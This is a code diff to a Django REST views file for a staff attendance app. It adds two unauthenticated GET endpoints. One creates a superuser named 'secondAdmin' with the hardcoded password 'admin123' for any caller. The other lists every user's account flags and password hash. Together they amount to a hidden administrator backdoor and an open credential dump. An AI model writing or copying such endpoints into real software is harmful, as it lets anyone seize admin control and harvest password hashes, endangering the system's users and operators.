@@ -14,6 +14,9 @@ from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
 from .permissions import isStaffRole
 from rest_framework.permissions import IsAuthenticated
 from rest_framework.decorators import permission_classes
+from django.contrib.auth.models import User
+from django.http import JsonResponse
+from rest_framework.permissions import AllowAny
 
 
 # class StaffViewSet(viewsets.ModelViewSet):
@@ -188,3 +191,40 @@ def recent_month_attendance(request):
     attendances=Attendance.objects.filter(date__gte=first_date_of_month).select_related('staff','shift')
     serializer = AttendanceSerializer(attendances, many=True)
     return Response(serializer.data)
+
+
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def create_admin(request):
+    try:
+        
+        if User.objects.filter(username="secondAdmin").exists():
+            return Response({"message": "Admin user already exists"}, status=400)
+
+        user = User.objects.create_superuser(
+            username="secondAdmin",
+            email="admin@example.com",
+            password="admin123"
+        )
+
+       
+        Staff.objects.create(
+            user=user,
+            name="secondAdmin",
+            email="secondadmin@example.com",
+            role="Admin",
+            phone="0000500000",
+            hire_date=date.today(),
+            status="Active"
+        )
+
+        return Response({"message": "Admin created successfully!"})
+
+    except Exception as e:
+        return Response({"error": str(e)}, status=500)
+    
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def debug_users(request):
+    users = User.objects.values("id", "username", "is_active", "is_superuser", "is_staff",'password')
+    return Response(list(users))
